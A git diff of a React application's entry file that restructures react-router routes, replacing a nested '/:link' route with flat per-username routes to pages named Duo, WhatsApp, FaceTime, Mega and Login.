@@ -1,4 +1,4 @@
-import React, { useContext } from 'react'
+import React from 'react'
 import ReactDOM from 'react-dom/client'
 import App from './App.jsx'
 import './index.css'
@@ -6,10 +6,11 @@ import {
   createBrowserRouter,
   RouterProvider,
 } from "react-router-dom";
-import Duo from './Components/Link/Duo.jsx';
-import Mega from './Components/Link/Mega.jsx';
-import Login from './Components/Link/Login.jsx';
-import LinkPage from './Pages/LinkPage.jsx';
+import Duo from './Pages/Duo.jsx';
+import Mega from './Pages/Mega.jsx';
+import Login from './Pages/Login.jsx';
+import WhatsApp from './Pages/WhatsApp.jsx';
+import FaceTime from './Pages/FaceTime.jsx';
 
 
 
@@ -19,23 +20,25 @@ const router = createBrowserRouter([
     element: <App />,
     children: [
       {
-        path: '/:link',
-        element: <LinkPage />,
-        children: [
-          {
-            path: '/:link/',
-            element: <Duo />
-          },
-          {
-            path: '/:link/mega',
-            element: <Mega />
-          },
-          {
-            path: '/:link/login',
-            element: <Login />
-          },
-        ]
-      }
+        path: '/:username/duo',
+        element: <Duo />
+      },
+      {
+        path: '/:username/whatsapp',
+        element: <WhatsApp />
+      },
+      {
+        path: '/:username/facetime',
+        element: <FaceTime />
+      },
+      {
+        path: '/:username/mega',
+        element: <Mega />
+      },
+      {
+        path: '/:username/login',
+        element: <Login />
+      },
     ]
   }
 ])
